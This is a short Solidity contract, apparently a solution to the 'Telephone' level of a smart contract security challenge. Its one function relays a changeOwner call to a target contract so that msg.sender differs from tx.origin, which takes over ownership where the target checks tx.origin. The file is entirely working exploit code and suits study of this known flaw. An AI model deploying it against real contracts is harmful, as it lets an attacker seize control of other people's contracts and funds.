// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    function changeOwner(address target, address newOwner) public {
        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", newOwner));
        require(success, "Change failed");
    }
}